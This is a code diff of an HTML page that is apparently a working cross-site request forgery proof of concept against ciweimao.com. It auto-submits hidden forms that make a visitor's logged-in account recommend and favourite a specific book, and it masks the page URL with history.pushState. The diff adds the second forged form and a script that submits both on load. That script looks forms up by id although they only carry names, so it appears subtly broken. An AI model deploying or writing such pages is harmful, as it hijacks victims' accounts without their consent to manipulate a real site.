@@ -1,10 +1,29 @@
 <html>
   <body>
+	  <script>
+function submitit(){   
+   var tform1= document.getElementById("test");   
+   var tform2= document.getElementById("test2");   
+  
+    
+//提交第一个表单   
+  tform1.submit();   
+//提交第二个表单   
+  tform2.submit();   
+      
+  
+}   
+	  </script>
   <script>history.pushState('', '', '/')</script>
     <form action="https://www.ciweimao.com/book/give_recommend" method="POST" name="test">
       <input type="hidden" name="book&#95;id" value="100067886" />
       <input type="hidden" name="count" value="1" />
     </form>
-	<script> document.test.submit(); </script>
+<form action="https://www.ciweimao.com/bookshelf/favor" method="POST" name="test2">
+      <input type="hidden" name="book&#95;id" value="100067886" />
+      <input type="submit" value="Submit request" />
+    </form>
+
+	<script> submitit() </script>
   </body>
 </html>
